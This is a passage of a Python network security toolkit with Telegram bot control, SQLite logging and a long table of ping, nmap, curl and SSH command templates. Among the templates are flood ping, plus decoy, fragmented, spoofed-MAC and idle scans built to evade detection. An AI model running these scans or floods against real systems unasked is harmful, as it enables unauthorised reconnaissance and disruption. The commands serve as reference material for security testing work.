#!/usr/bin/env python3
"""
🚀 Accurate Cyber Defense Spider Bot
Author: Ian Carter Kulani
Version: v1.0.0

COMBINES:
- Accurate Cyber Defense 
- Spider Bot v0.0.1 (500+ commands)
- Enhanced Netcat Integration
- Complete Telegram Bot (500+ commands)

FEATURES:
• 500+ Complete Commands Support
• Enhanced Interactive Traceroute
• Advanced Network Scanning
• Complete Netcat Integration
• Real-time Threat Detection
• Database Logging & Reporting
• Professional Security Analysis
• Network Traffic Generation Tools
• Comprehensive Threat Intelligence
• Multi-threaded Monitoring Engine
• IP Geolocation & WHOIS Lookup
• 500+ Telegram Commands Integration
"""

import os
import sys
import json
import time
import socket
import threading
import subprocess
import requests
import logging
import platform
import psutil
import hashlib
import sqlite3
import ipaddress
import re
import random
import datetime
import signal
import select
import asyncio
import uuid
import getpass
import base64
from pathlib import Path
from typing import Dict, List, Set, Optional, Tuple, Any, Union
from dataclasses import dataclass, asdict
from colorama import init, Fore, Style, Back
import shutil
import urllib.parse

# Optional imports with fallbacks
try:
    import whois
    WHOIS_AVAILABLE = True
except ImportError:
    WHOIS_AVAILABLE = False

try:
    import qrcode
    QRCODE_AVAILABLE = True
except ImportError:
    QRCODE_AVAILABLE = False

# Initialize colorama
init(autoreset=True)

# ============================================================================
# CONFIGURATION
# ============================================================================

# File paths
CONFIG_DIR = ".ultimate_cyber"
CONFIG_FILE = os.path.join(CONFIG_DIR, "config.json")
TELEGRAM_CONFIG_FILE = os.path.join(CONFIG_DIR, "telegram_config.json")
LOG_FILE = os.path.join(CONFIG_DIR, "ultimate_cyber.log")
DATABASE_FILE = os.path.join(CONFIG_DIR, "network_data.db")
REPORT_DIR = "reports"
SCAN_RESULTS_DIR = "scan_results"
ALERTS_DIR = "alerts"
TEMPLATES_DIR = "templates"
CRYPTO_DIR = "crypto"
STEGANO_DIR = "stegano"
EXPLOITS_DIR = "exploits"
PAYLOADS_DIR = "payloads"
WORDLISTS_DIR = "wordlists"
CAPTURES_DIR = "captures"
BACKUPS_DIR = "backups"
IOT_SCANS_DIR = os.path.join(SCAN_RESULTS_DIR, "iot")
SOCIAL_ENG_DIR = "social_engineering"
NETCAT_SCRIPTS_DIR = "netcat_scripts"
COMMAND_HISTORY_FILE = "command_history.json"
SCRIPT_DIR = "scripts"

# Create necessary directories
directories = [
    CONFIG_DIR, REPORT_DIR, SCAN_RESULTS_DIR, ALERTS_DIR, TEMPLATES_DIR,
    CRYPTO_DIR, STEGANO_DIR, EXPLOITS_DIR, PAYLOADS_DIR, WORDLISTS_DIR,
    CAPTURES_DIR, BACKUPS_DIR, IOT_SCANS_DIR, SOCIAL_ENG_DIR,
    NETCAT_SCRIPTS_DIR, SCRIPT_DIR
]
for directory in directories:
    os.makedirs(directory, exist_ok=True)

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler(sys.stdout)
    ]
)

logger = logging.getLogger("UltimateCyberToolkit")

# Nmap scan types
NMAP_SCAN_TYPES = {
    'quick': '-T4 -F',
    'stealth': '-sS -T2',
    'comprehensive': '-sS -sV -sC -A -O',
    'udp': '-sU',
    'vulnerability': '-sV --script vuln',
    'full': '-p- -sV -sC -A -O',
    'syn': '-sS',
    'aggressive': '-A',
    'os_detection': '-O',
    'service_detection': '-sV',
    'discovery': '-sn',
    'idle': '-sI'
}

# ============================================================================
# DATA CLASSES
# ============================================================================

@dataclass
class ThreatAlert:
    """Threat alert data class"""
    timestamp: str
    threat_type: str
    source_ip: str
    severity: str
    description: str
    action_taken: str

@dataclass
class ScanResult:
    """Scan result data class"""
    scan_id: str
    success: bool
    target: str
    scan_type: str
    cmd: str
    execution_time: float
    result: Dict
    vulnerabilities: List[Dict]
    raw_output: str
    timestamp: str

@dataclass
class NetworkConnection:
    """Network connection data class"""
    local_ip: str
    local_port: int
    remote_ip: str
    remote_port: int
    status: str
    process_name: str
    protocol: str

@dataclass
class PortInfo:
    port: int
    protocol: str
    state: str
    service: str
    version: Optional[str] = None

@dataclass
class Vulnerability:
    port: int
    issues: List[str]

@dataclass
class ThreatIntel:
    ip: str
    threat_type: str
    severity: str
    confidence: float
    description: str
    timestamp: str
    source: str

# ============================================================================
# CONFIGURATION MANAGER
# ============================================================================

class ConfigManager:
    """Enhanced configuration manager with validation"""
    
    DEFAULT_CONFIG = {
        "monitoring": {
            "enabled": False,
            "port_scan_threshold": 10,
            "syn_flood_threshold": 100,
            "udp_flood_threshold": 500,
            "http_flood_threshold": 200,
            "ddos_threshold": 1000
        },
        "scanning": {
            "default_ports": "1-1000",
            "timeout": 30,
            "rate_limit": False
        },
        "telegram": {
            "enabled": False,
            "token": "",
            "chat_id": "",
            "notifications": True
        },
        "security": {
            "auto_block": False,
            "log_level": "INFO",
            "backup_enabled": True
        },
        "netcat": {
            "default_port": 4444,
            "timeout": 30,
            "buffer_size": 1024
        }
    }
    
    @staticmethod
    def load_config() -> Dict:
        """Load configuration from file"""
        try:
            if os.path.exists(CONFIG_FILE):
                with open(CONFIG_FILE, 'r') as f:
                    config = json.load(f)
                    # Merge with defaults
                    ConfigManager._deep_update(config, ConfigManager.DEFAULT_CONFIG)
                    return config
        except Exception as e:
            logger.error(f"Failed to load config: {e}")
        
        return ConfigManager.DEFAULT_CONFIG.copy()
    
    @staticmethod
    def save_config(config: Dict) -> bool:
        """Save configuration to file"""
        try:
            with open(CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=4)
            logger.info("Configuration saved successfully")
            return True
        except Exception as e:
            logger.error(f"Failed to save config: {e}")
            return False
    
    @staticmethod
    def load_telegram_config() -> Dict:
        """Load Telegram configuration"""
        try:
            if os.path.exists(TELEGRAM_CONFIG_FILE):
                with open(TELEGRAM_CONFIG_FILE, 'r') as f:
                    return json.load(f)
        except Exception as e:
            logger.error(f"Failed to load Telegram config: {e}")
        
        return {"token": "", "chat_id": "", "enabled": False, "bot_username": ""}
    
    @staticmethod
    def save_telegram_config(token: str, chat_id: str, enabled: bool = True, bot_username: str = "") -> bool:
        """Save Telegram configuration"""
        try:
            config = {
                "token": token,
                "chat_id": chat_id,
                "enabled": enabled,
                "bot_username": bot_username,
                "last_updated": datetime.datetime.now().isoformat()
            }
            with open(TELEGRAM_CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=4)
            logger.info("Telegram configuration saved")
            return True
        except Exception as e:
            logger.error(f"Failed to save Telegram config: {e}")
            return False
    
    @staticmethod
    def _deep_update(source: Dict, updates: Dict) -> None:
        """Deep update dictionary"""
        for key, value in updates.items():
            if key in source and isinstance(source[key], dict) and isinstance(value, dict):
                ConfigManager._deep_update(source[key], value)
            else:
                source[key] = value

# ============================================================================
# TELEGRAM CONFIG MANAGER
# ============================================================================

class TelegramConfigManager:
    """Enhanced Telegram Bot Configuration Manager"""
    
    def __init__(self):
        self.token = None
        self.chat_id = None
        self.bot_username = None
        self.enabled = False
        self.load_config()
    
    def load_config(self):
        """Load Telegram configuration"""
        config = ConfigManager.load_telegram_config()
        self.token = config.get('token')
        self.chat_id = config.get('chat_id')
        self.bot_username = config.get('bot_username')
        self.enabled = config.get('enabled', False)
    
    def save_config(self):
        """Save Telegram configuration"""
        return ConfigManager.save_telegram_config(
            self.token, self.chat_id, self.enabled, self.bot_username
        )
    
    def validate_config(self):
        """Validate Telegram configuration"""
        if not self.token:
            return False, "Token is required"
        
        if not self.chat_id:
            return False, "Chat ID is required"
        
        # Basic token validation
        token_pattern = r'^\d{8,11}:[A-Za-z0-9_-]{35}$'
        if not re.match(token_pattern, self.token):
            return False, "Invalid token format"
        
        return True, "Configuration is valid"
    
    def test_connection(self):
        """Test Telegram bot connection"""
        if not self.token or not self.chat_id:
            return False, "Token or Chat ID not configured"
        
        try:
            url = f"https://api.telegram.org/bot{self.token}/getMe"
            response = requests.get(url, timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                if data.get('ok'):
                    bot_info = data.get('result', {})
                    self.bot_username = bot_info.get('username')
                    self.save_config()
                    
                    # Send test message
                    test_msg = self.send_message("🚀Accurate Cyber Defense Spider Bot Pro connected!")
                    
                    if test_msg:
                        return True, f"✅ Connected as @{self.bot_username}"
                    else:
                        return True, f"✅ Bot verified but message sending failed"
                else:
                    return False, f"API error: {data.get('description')}"
            else:
                return False, f"HTTP error: {response.status_code}"
        except Exception as e:
            return False, f"Connection error: {str(e)}"
    
    def send_message(self, message: str, parse_mode: str = 'HTML', disable_preview: bool = True):
        """Send message to Telegram"""
        if not self.token or not self.chat_id:
            return False
        
        try:
            url = f"https://api.telegram.org/bot{self.token}/sendMessage"
            
            # Split long messages
            if len(message) > 4096:
                messages = [message[i:i+4000] for i in range(0, len(message), 4000)]
                for msg in messages:
                    payload = {
                        'chat_id': self.chat_id,
                        'text': msg,
                        'parse_mode': parse_mode,
                        'disable_web_page_preview': disable_preview
                    }
                    
                    response = requests.post(url, json=payload, timeout=10)
                    if response.status_code != 200:
                        logger.error(f"Telegram send failed: {response.text}")
                        return False
                    time.sleep(0.5)
                return True
            else:
                payload = {
                    'chat_id': self.chat_id,
                    'text': message,
                    'parse_mode': parse_mode,
                    'disable_web_page_preview': disable_preview
                }
                
                response = requests.post(url, json=payload, timeout=10)
                
                if response.status_code == 200:
                    return True
                else:
                    logger.error(f"Telegram send failed: {response.text}")
                    return False
                    
        except Exception as e:
            logger.error(f"Telegram send error: {e}")
            return False
    
    def interactive_setup(self):
        """Interactive Telegram setup wizard"""
        print("\n" + "="*60)
        print("🤖 TELEGRAM BOT SETUP WIZARD")
        print("="*60)
        
        print("\nTo enable 500+ Telegram commands:")
        print("1. Open Telegram and search for @BotFather")
        print("2. Send /newbot to create a new bot")
        print("3. Choose a name for your bot")
        print("4. Choose a username (must end with 'bot')")
        print("5. Copy the token provided by BotFather")
        print("\nFor Chat ID:")
        print("1. Search for @userinfobot on Telegram")
        print("2. Send /start to the bot")
        print("3. Copy your numerical chat ID")
        print("\n" + "-"*60)
        
        while True:
            token = input("\nEnter bot token (or 'skip' to skip): ").strip()
            
            if token.lower() == 'skip':
                print("⚠️ Telegram setup skipped")
                return False
            
            if not token:
                print("❌ Token cannot be empty")
                continue
            
            # Validate token format
            token_pattern = r'^\d{8,11}:[A-Za-z0-9_-]{35}$'
            if not re.match(token_pattern, token):
                print("❌ Invalid token format. Example: 1234567890:ABCdefGHIjklMNOpqrsTUVwxyz")
                continue
            
            self.token = token
            
            chat_id = input("\nEnter your chat ID (or 'skip' to skip): ").strip()
            
            if chat_id.lower() == 'skip':
                print("⚠️ Telegram setup incomplete")
                return False
            
            if not chat_id.isdigit():
                print("❌ Chat ID must be numeric")
                continue
            
            self.chat_id = chat_id
            
            # Test connection
            print("\n🔌 Testing connection...")
            success, message = self.test_connection()
            
            if success:
                self.enabled = True
                self.save_config()
                
                print("\n" + "="*60)
                print("✅ TELEGRAM SETUP COMPLETE!")
                print("="*60)
                print(f"\nBot: @{self.bot_username}")
                print(f"Chat ID: {self.chat_id}")
                print(f"Status: Connected")
                print("\nSend /start to your bot to begin!")
                return True
            else:
                print(f"❌ Connection failed: {message}")
                retry = input("\nRetry setup? (y/n): ").lower()
                if retry != 'y':
                    return False

# ============================================================================
# DATABASE MANAGER (ENHANCED)
# ============================================================================

class DatabaseManager:
    """Enhanced database manager with comprehensive logging"""
    
    def __init__(self, db_path: str = DATABASE_FILE):
        self.db_path = db_path
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self.cursor = self.conn.cursor()
        self.init_tables()
        self.init_command_templates()
        self.init_netcat_templates()
    
    def init_tables(self):
        """Initialize all database tables"""
        tables = [
            # Threats table
            """
            CREATE TABLE IF NOT EXISTS threats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                threat_type TEXT NOT NULL,
                source_ip TEXT NOT NULL,
                severity TEXT NOT NULL,
                description TEXT,
                action_taken TEXT,
                resolved BOOLEAN DEFAULT 0
            )
            """,
            
            # Commands history
            """
            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                command TEXT NOT NULL,
                source TEXT DEFAULT 'local',
                success BOOLEAN DEFAULT 1,
                output TEXT,
                execution_time REAL,
                user TEXT
            )
            """,
            
            # Scan results
            """
            CREATE TABLE IF NOT EXISTS scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                scan_type TEXT NOT NULL,
                open_ports TEXT,
                services TEXT,
                os_info TEXT,
                vulnerabilities TEXT,
                execution_time REAL,
                risk_level TEXT,
                scan_id TEXT UNIQUE
            )
            """,
            
            # Network connections
            """
            CREATE TABLE IF NOT EXISTS connections (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                local_ip TEXT,
                local_port INTEGER,
                remote_ip TEXT,
                remote_port INTEGER,
                status TEXT,
                process_name TEXT,
                protocol TEXT
            )
            """,
            
            # Traceroute results
            """
            CREATE TABLE IF NOT EXISTS traceroute_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                command TEXT NOT NULL,
                output TEXT,
                execution_time REAL,
                hops INTEGER
            )
            """,
            
            # Monitored IPs
            """
            CREATE TABLE IF NOT EXISTS monitored_ips (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address TEXT UNIQUE NOT NULL,
                added_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                is_active BOOLEAN DEFAULT 1,
                threat_level INTEGER DEFAULT 0,
                last_scan TIMESTAMP,
                hostname TEXT,
                os TEXT,
                country TEXT,
                notes TEXT
            )
            """,
            
            # Command templates
            """
            CREATE TABLE IF NOT EXISTS command_templates (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT UNIQUE NOT NULL,
                category TEXT NOT NULL,
                command TEXT NOT NULL,
                description TEXT,
                usage TEXT
            )
            """,
            
            # Netcat commands
            """
            CREATE TABLE IF NOT EXISTS netcat_commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT UNIQUE NOT NULL,
                command TEXT NOT NULL,
                description TEXT,
                usage TEXT,
                category TEXT DEFAULT 'netcat'
            )
            """,
            
            # System metrics
            """
            CREATE TABLE IF NOT EXISTS system_metrics (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                cpu_percent REAL,
                memory_percent REAL,
                disk_percent REAL,
                network_sent INTEGER,
                network_recv INTEGER,
                connections_count INTEGER,
                processes_count INTEGER
            )
            """,
            
            # Telegram commands
            """
            CREATE TABLE IF NOT EXISTS telegram_commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                chat_id TEXT,
                user_id TEXT,
                command TEXT NOT NULL,
                success BOOLEAN DEFAULT 1,
                response_time REAL,
                ip_address TEXT
            )
            """
        ]
        
        for table_sql in tables:
            self.cursor.execute(table_sql)
        
        self.conn.commit()
    
    def init_command_templates(self):
        """Initialize command templates database"""
        
        templates = [
            # ==================== PING COMMANDS ====================
            ('ping_basic', 'ping', 'ping {target}', 'Basic ping', 'ping <ip>'),
            ('ping_count_4', 'ping', 'ping {target} -c 4', 'Ping with 4 packets', 'ping <ip> -c 4'),
            ('ping_count_10', 'ping', 'ping {target} -c 10', 'Ping with 10 packets', 'ping <ip> -c 10'),
            ('ping_interval_0.2', 'ping', 'ping {target} -i 0.2', 'Fast ping interval', 'ping <ip> -i 0.2'),
            ('ping_wait_5', 'ping', 'ping {target} -w 5', '5 second timeout', 'ping <ip> -w 5'),
            ('ping_size_1024', 'ping', 'ping {target} -s 1024', '1024 byte packets', 'ping <ip> -s 1024'),
            ('ping_size_1472', 'ping', 'ping {target} -s 1472', 'MTU size packets', 'ping <ip> -s 1472'),
            ('ping_flood', 'ping', 'ping {target} -f', 'Flood ping', 'ping <ip> -f'),
            ('ping_ttl_64', 'ping', 'ping {target} -t 64', 'TTL 64', 'ping <ip> -t 64'),
            ('ping_ipv6', 'ping', 'ping6 {target}', 'IPv6 ping', 'ping6 <ip>'),
            
            # ==================== NMAP COMMANDS ====================
            ('nmap_basic', 'scan', 'nmap {target}', 'Basic nmap scan', 'nmap <ip>'),
            ('nmap_stealth', 'scan', 'nmap {target} -sS', 'SYN stealth scan', 'nmap <ip> -sS'),
            ('nmap_udp', 'scan', 'nmap {target} -sU', 'UDP scan', 'nmap <ip> -sU'),
            ('nmap_os', 'scan', 'nmap {target} -O', 'OS detection', 'nmap <ip> -O'),
            ('nmap_version', 'scan', 'nmap {target} -sV', 'Version detection', 'nmap <ip> -sV'),
            ('nmap_aggressive', 'scan', 'nmap {target} -A', 'Aggressive scan', 'nmap <ip> -A'),
            ('nmap_ports_top100', 'scan', 'nmap {target} --top-ports 100', 'Top 100 ports', 'nmap <ip> --top-ports 100'),
            ('nmap_ports_all', 'scan', 'nmap {target} -p-', 'All ports', 'nmap <ip> -p-'),
            ('nmap_quick', 'scan', 'nmap {target} -T4 -F', 'Quick scan', 'nmap <ip> -T4 -F'),
            ('nmap_traceroute', 'scan', 'nmap {target} --traceroute', 'Scan with traceroute', 'nmap <ip> --traceroute'),
            ('nmap_script_vuln', 'scan', 'nmap {target} --script vuln', 'Vulnerability scripts', 'nmap <ip> --script vuln'),
            ('nmap_script_safe', 'scan', 'nmap {target} --script safe', 'Safe scripts', 'nmap <ip> --script safe'),
            ('nmap_script_auth', 'scan', 'nmap {target} --script auth', 'Authentication scripts', 'nmap <ip> --script auth'),
            ('nmap_script_discovery', 'scan', 'nmap {target} --script discovery', 'Discovery scripts', 'nmap <ip> --script discovery'),
            ('nmap_no_ping', 'scan', 'nmap {target} -Pn', 'No ping scan', 'nmap <ip> -Pn'),
            ('nmap_syn_stealth', 'scan', 'nmap {target} -sS -T4', 'SYN stealth with timing', 'nmap <ip> -sS -T4'),
            ('nmap_fin_scan', 'scan', 'nmap {target} -sF', 'FIN scan', 'nmap <ip> -sF'),
            ('nmap_xmas_scan', 'scan', 'nmap {target} -sX', 'XMAS scan', 'nmap <ip> -sX'),
            ('nmap_null_scan', 'scan', 'nmap {target} -sN', 'NULL scan', 'nmap <ip> -sN'),
            ('nmap_ack_scan', 'scan', 'nmap {target} -sA', 'ACK scan', 'nmap <ip> -sA'),
            ('nmap_window_scan', 'scan', 'nmap {target} -sW', 'Window scan', 'nmap <ip> -sW'),
            ('nmap_maimon_scan', 'scan', 'nmap {target} -sM', 'Maimon scan', 'nmap <ip> -sM'),
            ('nmap_idle_scan', 'scan', 'nmap {target} -sI zombie_ip', 'Idle scan', 'nmap <ip> -sI zombie_ip'),
            ('nmap_sctp_init', 'scan', 'nmap {target} -sY', 'SCTP INIT scan', 'nmap <ip> -sY'),
            ('nmap_sctp_cookie', 'scan', 'nmap {target} -sZ', 'SCTP COOKIE ECHO', 'nmap <ip> -sZ'),
            ('nmap_ip_protocol', 'scan', 'nmap {target} -sO', 'IP protocol scan', 'nmap <ip> -sO'),
            ('nmap_list_scan', 'scan', 'nmap {target} -sL', 'List scan', 'nmap <ip> -sL'),
            ('nmap_fragment', 'scan', 'nmap {target} -f', 'Fragment packets', 'nmap <ip> -f'),
            ('nmap_decoy', 'scan', 'nmap {target} -D RND:10', 'Decoy scan', 'nmap <ip> -D RND:10'),
            ('nmap_spoof_mac', 'scan', 'nmap {target} --spoof-mac 0', 'Spoof MAC address', 'nmap <ip> --spoof-mac 0'),
            ('nmap_data_length', 'scan', 'nmap {target} --data-length 100', 'Append random data', 'nmap <ip> --data-length 100'),
            ('nmap_random_hosts', 'scan', 'nmap {target} --randomize-hosts', 'Randomize hosts', 'nmap <ip> --randomize-hosts'),
            ('nmap_badsum', 'scan', 'nmap {target} --badsum', 'Bad checksum', 'nmap <ip> --badsum'),
            
            # ==================== CURL COMMANDS ====================
            ('curl_basic', 'web', 'curl {target}', 'Basic curl request', 'curl <url>'),
            ('curl_headers', 'web', 'curl {target} -I', 'Headers only', 'curl <url> -I'),
            ('curl_verbose', 'web', 'curl {target} -v', 'Verbose output', 'curl <url> -v'),
            ('curl_silent', 'web', 'curl {target} -s', 'Silent mode', 'curl <url> -s'),
            ('curl_follow', 'web', 'curl {target} -L', 'Follow redirects', 'curl <url> -L'),
            ('curl_insecure', 'web', 'curl {target} -k', 'Allow insecure SSL', 'curl <url> -k'),
            ('curl_post', 'web', 'curl {target} -X POST', 'POST request', 'curl <url> -X POST'),
            ('curl_put', 'web', 'curl {target} -X PUT', 'PUT request', 'curl <url> -X PUT'),
            ('curl_delete', 'web', 'curl {target} -X DELETE', 'DELETE request', 'curl <url> -X DELETE'),
            ('curl_head', 'web', 'curl {target} -X HEAD', 'HEAD request', 'curl <url> -X HEAD'),
            ('curl_json', 'web', 'curl {target} -H "Content-Type: application/json"', 'JSON request', 'curl <url> -H "Content-Type: application/json"'),
            ('curl_form', 'web', 'curl {target} -F "field=value"', 'Form data', 'curl <url> -F "field=value"'),
            ('curl_data', 'web', 'curl {target} -d "param=value"', 'POST data', 'curl <url> -d "param=value"'),
            ('curl_binary', 'web', 'curl {target} --data-binary @file', 'Binary data', 'curl <url> --data-binary @file'),
            ('curl_cookies', 'web', 'curl {target} -b cookies.txt', 'Send cookies', 'curl <url> -b cookies.txt'),
            ('curl_save_cookies', 'web', 'curl {target} -c cookies.txt', 'Save cookies', 'curl <url> -c cookies.txt'),
            ('curl_user_agent', 'web', 'curl {target} -A "Mozilla/5.0"', 'Custom user agent', 'curl <url> -A "Mozilla/5.0"'),
            ('curl_referer', 'web', 'curl {target} -e "http://referer.com"', 'Set referer', 'curl <url> -e "http://referer.com"'),
            ('curl_auth_basic', 'web', 'curl {target} -u user:pass', 'Basic auth', 'curl <url> -u user:pass'),
            ('curl_auth_bearer', 'web', 'curl {target} -H "Authorization: Bearer token"', 'Bearer token', 'curl <url> -H "Authorization: Bearer token"'),
            ('curl_timeout', 'web', 'curl {target} --max-time 10', 'Timeout 10s', 'curl <url> --max-time 10'),
            ('curl_connect_timeout', 'web', 'curl {target} --connect-timeout 5', 'Connect timeout', 'curl <url> --connect-timeout 5'),
            ('curl_retry', 'web', 'curl {target} --retry 3', 'Retry 3 times', 'curl <url> --retry 3'),
            ('curl_limit_rate', 'web', 'curl {target} --limit-rate 100K', 'Limit rate 100KB/s', 'curl <url> --limit-rate 100K'),
            ('curl_output', 'web', 'curl {target} -o output.txt', 'Save output', 'curl <url> -o output.txt'),
            ('curl_remote_name', 'web', 'curl {target} -O', 'Save with remote name', 'curl <url> -O'),
            ('curl_compressed', 'web', 'curl {target} --compressed', 'Accept compression', 'curl <url> --compressed'),
            ('curl_http2', 'web', 'curl {target} --http2', 'Use HTTP/2', 'curl <url> --http2'),
            ('curl_proxy', 'web', 'curl {target} --proxy http://proxy:8080', 'Use proxy', 'curl <url> --proxy http://proxy:8080'),
            ('curl_socks5', 'web', 'curl {target} --socks5-hostname proxy:1080', 'SOCKS5 proxy', 'curl <url> --socks5-hostname proxy:1080'),
            ('curl_interface', 'web', 'curl {target} --interface eth0', 'Specify interface', 'curl <url> --interface eth0'),
            ('curl_resolve', 'web', 'curl {target} --resolve example.com:443:1.2.3.4', 'Resolve host', 'curl <url> --resolve example.com:443:1.2.3.4'),
            ('curl_trace', 'web', 'curl {target} --trace trace.txt', 'Trace output', 'curl <url> --trace trace.txt'),
            ('curl_trace_ascii', 'web', 'curl {target} --trace-ascii trace.log', 'Trace ASCII', 'curl <url> --trace-ascii trace.log'),
            ('curl_dump_header', 'web', 'curl {target} -D header.txt', 'Dump headers', 'curl <url> -D header.txt'),
            ('curl_range', 'web', 'curl {target} -r 0-999', 'Byte range', 'curl <url> -r 0-999'),
            ('curl_ftp', 'web', 'curl {target} --user user:pass', 'FTP login', 'curl <url> --user user:pass'),
            ('curl_ftp_ssl', 'web', 'curl {target} --ftp-ssl', 'FTP over SSL', 'curl <url> --ftp-ssl'),
            ('curl_ftp_pasv', 'web', 'curl {target} --ftp-pasv', 'FTP passive mode', 'curl <url> --ftp-pasv'),
            ('curl_mail_from', 'web', 'curl {target} --mail-from sender@example.com', 'SMTP mail from', 'curl <url> --mail-from sender@example.com'),
            ('curl_mail_rcpt', 'web', 'curl {target} --mail-rcpt recipient@example.com', 'SMTP mail rcpt', 'curl <url> --mail-rcpt recipient@example.com'),
            ('curl_tlsv1_2', 'web', 'curl {target} --tlsv1.2', 'TLS 1.2', 'curl <url> --tlsv1.2'),
            ('curl_tlsv1_3', 'web', 'curl {target} --tlsv1.3', 'TLS 1.3', 'curl <url> --tlsv1.3'),
            ('curl_cert', 'web', 'curl {target} --cert client.pem', 'Client certificate', 'curl <url> --cert client.pem'),
            ('curl_key', 'web', 'curl {target} --key client.key', 'Client key', 'curl <url> --key client.key'),
            ('curl_cacert', 'web', 'curl {target} --cacert ca.pem', 'CA certificate', 'curl <url> --cacert ca.pem'),
            
            # ==================== SSH COMMANDS ====================
            ('ssh_basic', 'ssh', 'ssh {target}', 'Basic SSH connection', 'ssh <host>'),
            ('ssh_port', 'ssh', 'ssh {target} -p 22', 'SSH with port', 'ssh <host> -p 22'),
            ('ssh_verbose', 'ssh', 'ssh {target} -v', 'Verbose SSH', 'ssh <host> -v'),
            ('ssh_very_verbose', 'ssh', 'ssh {target} -vvv', 'Very verbose SSH', 'ssh <host> -vvv'),
            ('ssh_quiet', 'ssh', 'ssh {target} -q', 'Quiet mode', 'ssh <host> -q'),
            ('ssh_compression', 'ssh', 'ssh {target} -C', 'Compression enabled', 'ssh <host> -C'),
            ('ssh_no_exec', 'ssh', 'ssh {target} -N', 'No command execution', 'ssh <host> -N'),
            ('ssh_no_pty', 'ssh', 'ssh {target} -T', 'No TTY allocation', 'ssh <host> -T'),
            ('ssh_x11', 'ssh', 'ssh {target} -X', 'X11 forwarding', 'ssh <host> -X'),
            ('ssh_x11_trusted', 'ssh', 'ssh {target} -Y', 'Trusted X11 forwarding', 'ssh <host> -Y'),
            ('ssh_ipv4', 'ssh', 'ssh {target} -4', 'Force IPv4', 'ssh <host> -4'),
            ('ssh_ipv6', 'ssh', 'ssh {target} -6', 'Force IPv6', 'ssh <host> -6'),
            ('ssh_agent', 'ssh', 'ssh {target} -A', 'Agent forwarding', 'ssh <host> -A'),
            ('ssh_no_agent', 'ssh', 'ssh {target} -a', 'Disable agent forwarding', 'ssh <host> -a'),
            ('ssh_gssapi', 'ssh', 'ssh {target} -K', 'GSSAPI authentication', 'ssh <host> -K'),
            ('ssh_no_gssapi', 'ssh', 'ssh {target} -k', 'Disable GSSAPI', 'ssh <host> -k'),
            ('ssh_identity', 'ssh', 'ssh {target} -i ~/.ssh/id_rsa', 'Identity file', 'ssh <host> -i ~/.ssh/id_rsa'),
            ('ssh_strict', 'ssh', 'ssh {target} -o StrictHostKeyChecking=no', 'Disable strict checking', 'ssh <host> -o StrictHostKeyChecking=no'),
            ('ssh_connect_timeout', 'ssh', 'ssh {target} -o ConnectTimeout=10', 'Connect timeout', 'ssh <host> -o ConnectTimeout=10'),
            ('ssh_server_alive', 'ssh', 'ssh {target} -o ServerAliveInterval=60', 'Server alive interval', 'ssh <host> -o ServerAliveInterval=60'),
            ('ssh_local_port', 'ssh', 'ssh {target} -L 8080:localhost:80', 'Local port forwarding', 'ssh <host> -L 8080:localhost:80'),
            ('ssh_remote_port', 'ssh', 'ssh {target} -R 9000:localhost:9000', 'Remote port forwarding', 'ssh <host> -R 9000:localhost:9000'),
            ('ssh_dynamic_port', 'ssh', 'ssh {target} -D 1080', 'Dynamic port forwarding', 'ssh <host> -D 1080'),
            ('ssh_jump_host', 'ssh', 'ssh {target} -J jump@jumphost', 'Jump host', 'ssh <host> -J jump@jumphost'),
            ('ssh_bind_address', 'ssh', 'ssh {target} -b 192.168.1.100', 'Bind address', 'ssh <host> -b 192.168.1.100'),
            ('ssh_log_file', 'ssh', 'ssh {target} -E ssh.log', 'Log file', 'ssh <host> -E ssh.log'),
            ('ssh_config', 'ssh', 'ssh {target} -F ssh_config', 'Config file', 'ssh <host> -F ssh_config'),
            ('ssh_cipher', 'ssh', 'ssh {target} -c aes256-ctr', 'Cipher specification', 'ssh <host> -c aes256-ctr'),
            ('ssh_mac', 'ssh', 'ssh {target} -m hmac-sha2-256', 'MAC algorithm', 'ssh <host> -m hmac-sha2-256'),
            ('ssh_control_master', 'ssh', 'ssh {target} -M -S ~/.ssh/socket', 'Control master', 'ssh <host> -M -S ~/.ssh/socket'),
            ('ssh_control_persist', 'ssh', 'ssh {target} -o ControlPersist=yes', 'Control persist', 'ssh <host> -o ControlPersist=yes'),
            ('ssh_proxy_command', 'ssh', 'ssh {target} -o ProxyCommand="ssh proxy nc %h %p"', 'Proxy command', 'ssh <host> -o ProxyCommand="ssh proxy nc %h %p"'),
            ('ssh_proxy_jump', 'ssh', 'ssh {target} -o ProxyJump=jump@host', 'Proxy jump', 'ssh <host> -o ProxyJump=jump@host'),
            
            # ==================== TRACEROUTE COMMANDS ====================
            ('tracert_basic', 'traceroute', 'tracert {target}', 'Windows traceroute', 'tracert <ip>'),
            ('tracert_no_dns', 'traceroute', 'tracert {target} -d', 'No DNS resolution', 'tracert <ip> -d'),
            ('traceroute_basic', 'traceroute', 'traceroute {target}', 'Unix traceroute', 'traceroute <ip>'),
            ('traceroute_no_dns', 'traceroute', 'traceroute {target} -n', 'No DNS resolution', 'traceroute <ip> -n'),
